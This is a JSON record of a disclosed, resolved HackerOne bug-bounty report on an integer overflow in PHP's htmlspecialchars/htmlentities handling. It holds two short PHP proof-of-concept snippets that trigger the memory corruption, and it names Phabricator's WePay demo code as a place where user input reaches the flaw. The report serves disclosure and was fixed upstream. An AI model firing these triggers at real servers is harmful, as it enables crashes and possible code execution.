{
  "id": 140865,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDA4NjU=",
  "url": "https://hackerone.com/reports/140865",
  "title": "Integer Overflow in php_html_entities()",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-05-25T02:45:23.224Z",
  "submitted_at": "2016-05-25T02:45:23.224Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ryat",
    "url": "/ryat",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/wfyfjk9cawbuzqqdx88azrvxmqt6/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67?response-content-disposition=inline%3B%20filename%3D%22chtg.jpeg%22%3B%20filename%2A%3DUTF-8%27%27chtg.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTBAKTTIG%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T141621Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCzx13uyXaEtgboHQanmNeFlFhJ%2BpyTo4UygJmOKeZjZgIhAKlSnRlWe2USJWEJoxW2wLkzCRktCFOHUl%2FAlItmCWsCKrEFCBUQAxoMMDEzNjE5Mjc0ODQ5IgzQTEIrfzLIKzACNAgqjgWh59%2FyqIY13DFVWSsAneIjUML7Z2pI2Lt3VcZs5AkSuBfo8drZSiL8VTJtk82xf6DfIap6EaDJM%2FoVlDuHox%2FFd4iQH0AeW%2BmwZoE4Q0UpRRo7JAbcqqEDA0EqYyij7l%2FSVzSFnW5jxTyjoUEJ21mNlTsLiNnR5AVUTTgMoXA78XONzEngl6IYkX9u%2BfEyeFADgega2dZFG1AApkAHlBtJ%2BglwMqE1HRJoIsfWAiBxeQuQLiq3pPxufsQu0Ffbg0w7rnSU%2FhrYL7C6ZJYFgWPhP7Qocp0gBxOd%2BwJXPqfJunnkXxA4wVVL6NnRCuQEVrw%2Ft53yeyhFYAfDLlBfo3rfRL9WtYO1w72vshuAGhXV8qTEc8vmtnRRuHxomMZ8QvhBMONIAv6AKv%2BjyDt2nWlIDts5aqxeFubnOsdcP2He%2BdY7RGwEq9TDv8NU6%2BtEjGCrNdsoGd8zpNHfQVQFtRtsJyP0b5%2FdQJauvalvknVY20YUwxu9YwKZE0a%2FzX4%2Btc2aluyfg3a24YFsTwHWWdmfDgr5vKdWPAShFZTuT7I7FpnLhqHzMkoWGAvqrK350%2BKEgOS%2BSbE0ax8%2Fx%2FbUcD8dFQ07NfwuLCeXR617WeuQx7sny%2FYU3hcdAuE4SjInd6HsIgRfpTnNaHYdjFTOYFDDl16X2M%2F8P6jeFcpHjRMCtDe4NFWuIwA0CXbcNGK2PchpfnXGQFt0rG%2BVwrza5aDrmkEnh3%2FykWIz%2FbRUGMYE6BEYdzR33U8Ncr4JmuBHUXNJ6EjJLdAbdv6Sv7aDu7W9IURYLnFNdK1wJjvuRqzUdFmhTAdV3hZ%2B1WrBSc4SlpjdCdxCBe%2BvSS1%2B1o%2FZ5TVK30C0rsFokxUY6kHJ5rQwjc%2B%2FxgY6sAHCtAqgzrBXDF7BxwT3CJ7ekGaq81T9y6b1cykza7VxZo%2F%2BW5MEvvQFLPHjpxgHp1PkyO91jRrQQNU2R2%2Fqvb9lEU9drNuKzlSXyrUFhmLk7E8Ijs71mTGuMVMQkCU%2FehNfNhUqc%2FU24rCy10ChvKHyi0%2Fr26legvZiXoOoDmfuUxjdoh96T3tEQuuCHf4%2B7hpCcosvWhtCZsIbsZBPCjLETL105tGjLn2TOJcY9UFC4Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7a792c197d5212a4b70aa2833b5104a7c35c81953d6ec9bc3e3ebb742e08ba2d"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTBAKTTIG%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T141621Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCzx13uyXaEtgboHQanmNeFlFhJ%2BpyTo4UygJmOKeZjZgIhAKlSnRlWe2USJWEJoxW2wLkzCRktCFOHUl%2FAlItmCWsCKrEFCBUQAxoMMDEzNjE5Mjc0ODQ5IgzQTEIrfzLIKzACNAgqjgWh59%2FyqIY13DFVWSsAneIjUML7Z2pI2Lt3VcZs5AkSuBfo8drZSiL8VTJtk82xf6DfIap6EaDJM%2FoVlDuHox%2FFd4iQH0AeW%2BmwZoE4Q0UpRRo7JAbcqqEDA0EqYyij7l%2FSVzSFnW5jxTyjoUEJ21mNlTsLiNnR5AVUTTgMoXA78XONzEngl6IYkX9u%2BfEyeFADgega2dZFG1AApkAHlBtJ%2BglwMqE1HRJoIsfWAiBxeQuQLiq3pPxufsQu0Ffbg0w7rnSU%2FhrYL7C6ZJYFgWPhP7Qocp0gBxOd%2BwJXPqfJunnkXxA4wVVL6NnRCuQEVrw%2Ft53yeyhFYAfDLlBfo3rfRL9WtYO1w72vshuAGhXV8qTEc8vmtnRRuHxomMZ8QvhBMONIAv6AKv%2BjyDt2nWlIDts5aqxeFubnOsdcP2He%2BdY7RGwEq9TDv8NU6%2BtEjGCrNdsoGd8zpNHfQVQFtRtsJyP0b5%2FdQJauvalvknVY20YUwxu9YwKZE0a%2FzX4%2Btc2aluyfg3a24YFsTwHWWdmfDgr5vKdWPAShFZTuT7I7FpnLhqHzMkoWGAvqrK350%2BKEgOS%2BSbE0ax8%2Fx%2FbUcD8dFQ07NfwuLCeXR617WeuQx7sny%2FYU3hcdAuE4SjInd6HsIgRfpTnNaHYdjFTOYFDDl16X2M%2F8P6jeFcpHjRMCtDe4NFWuIwA0CXbcNGK2PchpfnXGQFt0rG%2BVwrza5aDrmkEnh3%2FykWIz%2FbRUGMYE6BEYdzR33U8Ncr4JmuBHUXNJ6EjJLdAbdv6Sv7aDu7W9IURYLnFNdK1wJjvuRqzUdFmhTAdV3hZ%2B1WrBSc4SlpjdCdxCBe%2BvSS1%2B1o%2FZ5TVK30C0rsFokxUY6kHJ5rQwjc%2B%2FxgY6sAHCtAqgzrBXDF7BxwT3CJ7ekGaq81T9y6b1cykza7VxZo%2F%2BW5MEvvQFLPHjpxgHp1PkyO91jRrQQNU2R2%2Fqvb9lEU9drNuKzlSXyrUFhmLk7E8Ijs71mTGuMVMQkCU%2FehNfNhUqc%2FU24rCy10ChvKHyi0%2Fr26legvZiXoOoDmfuUxjdoh96T3tEQuuCHf4%2B7hpCcosvWhtCZsIbsZBPCjLETL105tGjLn2TOJcY9UFC4Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2e8a7b8f2173b0d1700e6f7d7d74b77028b3960046e081823e8dbaf6551bb702",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTBAKTTIG%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T141621Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCzx13uyXaEtgboHQanmNeFlFhJ%2BpyTo4UygJmOKeZjZgIhAKlSnRlWe2USJWEJoxW2wLkzCRktCFOHUl%2FAlItmCWsCKrEFCBUQAxoMMDEzNjE5Mjc0ODQ5IgzQTEIrfzLIKzACNAgqjgWh59%2FyqIY13DFVWSsAneIjUML7Z2pI2Lt3VcZs5AkSuBfo8drZSiL8VTJtk82xf6DfIap6EaDJM%2FoVlDuHox%2FFd4iQH0AeW%2BmwZoE4Q0UpRRo7JAbcqqEDA0EqYyij7l%2FSVzSFnW5jxTyjoUEJ21mNlTsLiNnR5AVUTTgMoXA78XONzEngl6IYkX9u%2BfEyeFADgega2dZFG1AApkAHlBtJ%2BglwMqE1HRJoIsfWAiBxeQuQLiq3pPxufsQu0Ffbg0w7rnSU%2FhrYL7C6ZJYFgWPhP7Qocp0gBxOd%2BwJXPqfJunnkXxA4wVVL6NnRCuQEVrw%2Ft53yeyhFYAfDLlBfo3rfRL9WtYO1w72vshuAGhXV8qTEc8vmtnRRuHxomMZ8QvhBMONIAv6AKv%2BjyDt2nWlIDts5aqxeFubnOsdcP2He%2BdY7RGwEq9TDv8NU6%2BtEjGCrNdsoGd8zpNHfQVQFtRtsJyP0b5%2FdQJauvalvknVY20YUwxu9YwKZE0a%2FzX4%2Btc2aluyfg3a24YFsTwHWWdmfDgr5vKdWPAShFZTuT7I7FpnLhqHzMkoWGAvqrK350%2BKEgOS%2BSbE0ax8%2Fx%2FbUcD8dFQ07NfwuLCeXR617WeuQx7sny%2FYU3hcdAuE4SjInd6HsIgRfpTnNaHYdjFTOYFDDl16X2M%2F8P6jeFcpHjRMCtDe4NFWuIwA0CXbcNGK2PchpfnXGQFt0rG%2BVwrza5aDrmkEnh3%2FykWIz%2FbRUGMYE6BEYdzR33U8Ncr4JmuBHUXNJ6EjJLdAbdv6Sv7aDu7W9IURYLnFNdK1wJjvuRqzUdFmhTAdV3hZ%2B1WrBSc4SlpjdCdxCBe%2BvSS1%2B1o%2FZ5TVK30C0rsFokxUY6kHJ5rQwjc%2B%2FxgY6sAHCtAqgzrBXDF7BxwT3CJ7ekGaq81T9y6b1cykza7VxZo%2F%2BW5MEvvQFLPHjpxgHp1PkyO91jRrQQNU2R2%2Fqvb9lEU9drNuKzlSXyrUFhmLk7E8Ijs71mTGuMVMQkCU%2FehNfNhUqc%2FU24rCy10ChvKHyi0%2Fr26legvZiXoOoDmfuUxjdoh96T3tEQuuCHf4%2B7hpCcosvWhtCZsIbsZBPCjLETL105tGjLn2TOJcY9UFC4Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3480867873c9d492b0c03a1e695711dbc92de7793249c821663ecf867cf79492"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-10-13T11:04:30.404Z",
  "bug_reporter_agreed_on_going_public_at": "2019-10-13T11:04:30.340Z",
  "team_member_agreed_on_going_public_at": "2019-10-13T09:35:49.810Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "This bug report at https://bugs.php.net/bug.php?id=72135, and fixed in:\nhttps://github.com/php/php-src/commit/41fc3c76e97a36ff3b505da7d704ca17bb171fdf\nhttps://github.com/php/php-src/commit/0da8b8b801f9276359262f1ef8274c7812d3dfda\nhttps://github.com/php/php-src/commit/e9559131152ab0fa89737db11ebe8f43e1435b96\n\n```\nstatic void php_html_entities(INTERNAL_FUNCTION_PARAMETERS, int all)\n{\n\t...\n\tsize_t new_len;\n\t...\n\tRETVAL_STRINGL(replaced, (int)new_len, 0);\n}\n```\n\nThe new_len is defined as size_t, then to be a signed int in RETVAL_STRINGL(), that results in new_len into a negative value and get a corrupted string-typed ZVAL.\n\n```\nZEND_API int add_string_to_string(zval *result, const zval *op1, const zval *op2) /* {{{ */\n{\n\tint length = Z_STRLEN_P(op1) + Z_STRLEN_P(op2);\n\tchar *buf;\n\n\tif (IS_INTERNED(Z_STRVAL_P(op1))) {\n\t\tbuf = (char *) emalloc(length+1);\n\t\tmemcpy(buf, Z_STRVAL_P(op1), Z_STRLEN_P(op1));\n\t} else {\n\t\tbuf = (char *) erealloc(Z_STRVAL_P(op1), length+1);\n\t}\n\tmemcpy(buf + Z_STRLEN_P(op1), Z_STRVAL_P(op2), Z_STRLEN_P(op2));\n```\n\nThe string add operations with a corrupted string-type ZVAL will able to lead to integer overflow and remote code execution. \n\nPoC:\n```\n<?php\n\nini_set('memory_limit', -1);\n$str = htmlspecialchars(str_repeat('&', 0xffffffff/5));\necho \"$str\";\n\n?>\n```\n\nA lot of functions with a corrupted string-typed ZVAL will able to lead to memory corruption, ex:\n\n```\nmd5\n...\ndefined\nclass_exists\nfunction_exists\n...\ntrigger_error\ndate_default_timezone_set\nhash_init\n...\ndate\ngmdate\n...\ncollator_create\nnormalizer_normalize\ngrapheme_strlen\n...\n```\n\nPoC:\n```\n<?php\n\n\tini_set('memory_limit', -1);\n\t$str = htmlspecialchars(str_repeat('&', 0xffffffff/5));\n\tmd5($str);\n\t\n?>\n```\n\nExploitation of this bug in real world/apps:\n\nA lot of PHP apps use htmlspecialchars/htmlentities handles user input data, and successful exploitation of this bug is possible, ex Phabricator:\n\nhttps://github.com/phacility/phabricator/blob/121e68e3adae4cd21731b79c07ca89676def7e19/externals/wepay/demoapp/openaccount.php\n```\nif ($_SERVER['REQUEST_METHOD'] == 'POST') {\n\tif (isset($_POST['account_name']) && isset($_POST['account_description'])) {\n\t\t// WePay sanitizes its own data, but displaying raw POST data on your own site is a XSS security hole.\n\t\t$name = htmlentities($_POST['account_name']);\n\t\t$desc = htmlentities($_POST['account_description']);\n\t\ttry {\n\t\t\t$wepay = new WePay($_SESSION['wepay_access_token']);\n\t\t\t$account = $wepay->request('account/create', array(\n\t\t\t\t'name' => $name,\n\t\t\t\t'description' => $desc,\n\t\t\t));\n\t\t\techo \"Created account $name for '$desc'! View on WePay at <a href=\\\"$account->account_uri\\\">$account->account_uri</a>. See all of your accounts <a href=\\\"accountlist.php\\\">here</a>.\";\n\t\t}\n```",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-12T09:35:49.897Z",
  "allow_singular_disclosure_after": -184912831.36004317,
  "singular_disclosure_allowed": true,
  "vote_count": 6,
  "voters": [
    "bitquark",
    "smodnix",
    "ryat",
    "paulos__",
    "dyabla",
    "unihorn"
  ],
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
